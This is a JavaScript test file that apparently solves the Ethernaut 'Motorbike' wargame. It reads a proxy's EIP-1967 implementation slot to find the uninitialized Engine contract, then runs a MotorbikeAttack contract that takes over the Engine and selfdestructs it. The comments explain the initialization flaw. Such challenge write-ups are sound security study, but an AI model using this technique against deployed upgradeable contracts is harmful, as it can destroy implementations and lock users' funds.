// test/Motorbike.test.js

// load dependencies
const { expect } = require('chai');

// import utils from test helpers
const { BN, expectEvent, expectRevert } = require('@openzeppelin/test-helpers');
const { ethers } = require('hardhat');

// load compiled artifacts
const Motorbike        = artifacts.require('Motorbike');
const Engine           = artifacts.require('Engine');
const MotorbikeAttack  = artifacts.require('MotorbikeAttack');

// start test block
contract('Motorbike', function ([ owner, other ]) {

  beforeEach(async function () {
    // create engine contract
    this.engine = await Engine.new({from: owner});
    
    // setup motorbike contract, this uses delegatecall() to initialize() engine
    this.motorbike = await Motorbike.new(this.engine.address, {from: owner});
    // as it uses delegatecall() to initialize(), it is the storage of Motorbike
    // that is updated as initialized. This means that if we find out the address
    // of engine, we can call initialize on it directly to become upgrader in its 
    // own storage.

    // setup attack contract

    // read Motorbike's implementation storage slot to find address of engine;
    // Motorbike contract hardcodes this
    const extractedEngineAddress = ethers.utils.hexStripZeros(
        await ethers.provider.getStorageAt(this.motorbike.address
                                          ,"0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc")
    );
    // verify we have extracted correct address
    expect(extractedEngineAddress).to.equal(this.engine.address.toLowerCase());

    // setup attack contract
    this.attackContract = await MotorbikeAttack.new(extractedEngineAddress, {from: other});
  });

  it('test attack: selfdestruct engine', async function () {
    await this.attackContract.attack({from: other});
  });
});
